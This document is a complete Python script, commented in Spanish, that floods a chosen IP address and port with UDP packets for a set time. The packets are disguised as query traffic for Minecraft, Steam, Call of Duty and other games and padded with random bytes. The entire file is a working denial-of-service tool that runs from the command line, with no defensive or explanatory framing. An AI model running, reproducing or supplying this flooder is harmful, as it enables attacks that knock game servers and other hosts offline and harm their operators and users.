import socket
import random
import struct
import sys
import time

def udp_game_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Paquetes de juegos pesados
    game_packets = [
        # Minecraft Query (grande)
        b'\xFE\xFD\x09' + random._urandom(500),
        
        # Counter-Strike Source Query
        b'\xFF\xFF\xFF\xFFTSource Engine Query\x00' + random._urandom(400),
        
        # Among Us packet
        b'\x00' * 12 + random._urandom(300),
        
        # Fortnite-like (UDP grande)
        random._urandom(800),
        
        # Roblox UDP
        random._urandom(700),
        
        # Call of Duty query
        b'\xFF\xFF\xFF\xFFgetinfo\x00' + random._urandom(600),
        
        # GTA Online style
        random._urandom(900),
        
        # Steam query
        b'\xFF\xFF\xFF\xFF\x55' + random._urandom(500),
        
        # Battlefield packet
        random._urandom(850),
        
        # Apex Legends
        b'\xFF\xFF\xFF\xFFinfo\x00' + random._urandom(400),
        
        # Dota 2
        b'\xFF\xFF\xFF\xFF\x49' + random._urandom(600),
        
        # Overwatch-like
        random._urandom(750),
        
        # Rust server query
        b'\x00\x00\x00\x00' + random._urandom(500),
        
        # ARK Survival
        random._urandom(800),
        
        # Palworld
        b'\x50\x41\x4C' + random._urandom(600),  # "PAL"
        
        # Valorant-like
        b'\x03\x00\x00\x00' + random._urandom(400),
        
        # Rainbow Six
        b'\x02' + random._urandom(650),
        
        # Team Fortress 2
        b'\xFF\xFF\xFF\xFF\x56' + random._urandom(500),
        
        # Left 4 Dead 2
        b'\xFF\xFF\xFF\xFF\x4D' + random._urandom(450),
        
        # Satisfactory (grande)
        random._urandom(1000),
        
        # Sea of Thieves
        b'\x53\x4F\x54' + random._urandom(550),  # "SOT"
        
        # Phasmophobia
        b'\x50\x48\x41\x53' + random._urandom(400),  # "PHAS"
        
        # PUBG-like
        random._urandom(850),
        
        # Warzone
        b'\x57\x5A' + random._urandom(600),  # "WZ"
    ]
    
    timeout = time.time() + duration
    
    while time.time() < timeout:
        try:
            # Enviar ráfaga de 10-50 paquetes
            for _ in range(random.randint(10, 50)):
                packet = random.choice(game_packets)
                sock.sendto(packet, (target_ip, target_port))
            
            # Micro-pausa
            time.sleep(0.001)
            
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit(1)
    
    udp_game_flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
